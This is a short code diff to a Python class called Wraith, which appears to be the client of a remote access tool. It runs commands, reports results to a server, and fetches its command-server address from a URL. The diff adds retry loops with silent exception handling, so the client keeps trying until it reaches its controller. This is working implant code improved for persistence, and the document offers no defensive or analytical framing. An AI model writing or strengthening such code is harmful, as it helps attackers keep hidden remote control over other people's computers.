@@ -247,8 +247,10 @@ class Wraith():
                 # If there was an error, report it to the server
                 self.putresult(f"ERROR - {e}", f"Error while executing `{cmd[0]}`")
 
-# Get the address of the wraith API
-connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text
+while True:
+    # Get the address of the wraith API
+    try: connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text; break
+    except: pass
 
 wraith = Wraith(connect_url, CRYPT_KEY, aes)
 
@@ -264,7 +266,8 @@ while True:
         # in case the old one is no longer active and was updated
         while not wraith.login():
             time.sleep(10)
-            wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL).text
+            try: wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL).text
+            except: pass
         # Continue to the next loop (re-send heartbeat)
         continue
 
